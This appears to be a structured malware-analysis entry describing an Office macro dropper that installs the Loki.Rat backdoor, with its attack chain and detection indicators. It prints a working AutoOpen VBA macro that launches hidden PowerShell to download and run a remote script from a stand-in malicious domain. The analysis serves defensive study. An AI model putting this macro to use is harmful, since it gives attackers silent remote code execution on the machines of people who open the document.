package_info.package_manager: N/A (malicious macro dropper in Office documents)
package_info.why_malicious: The package is a backdoor malware delivered via malicious Office document macros, enabling remote access and data exfiltration from infected systems.

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim obj As Object
  Set obj = CreateObject("Wscript.Shell")
  obj.Run "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/loki.ps1')"
End Sub
malicious_snippets.code_behavior: At document open, the macro spawns a hidden PowerShell process that downloads and executes a remote script, leading to backdoor installation.

malice_analysis.why_suspicious: Macros that execute PowerShell to download and run remote code are a common malware delivery technique.
malice_analysis.violated_expectations: Normal Office documents should not execute code or download executables from the internet.
malice_analysis.similar_legitimate_use: Automated document processing in trusted, internal environments (rare).
key_indicators: AutoOpen macro triggers on document open
Use of Wscript.Shell to launch PowerShell

attack_chain.action: Victim opens malicious Office document, triggering macro execution.
attack_chain.leads_to: Download and execution of remote backdoor payload (Loki.Rat).

attack_chain.action: PowerShell downloads and executes the Loki.Rat backdoor.
attack_chain.leads_to: Establishes remote access for attacker, enabling data exfiltration and control.

behavioral_signatures: Office macro spawning PowerShell or cmd.exe
PowerShell downloading and executing remote scripts
Unusual network connections from Office processes
file_indicators: Office documents with embedded macros (AutoOpen, Document_Open)
References to suspicious domains or PowerShell scripts in macro code
network_indicators: Outbound HTTP/HTTPS requests to known malicious domains from Office or PowerShell processes
detection_knowledge.how_to_detect: Monitor for Office processes (winword.exe, excel.exe) spawning PowerShell or cmd.exe, especially when followed by network activity to untrusted domains. Scan Office documents for macros that use Wscript.Shell or similar objects to launch external processes. Flag documents with AutoOpen macros that reference external URLs.
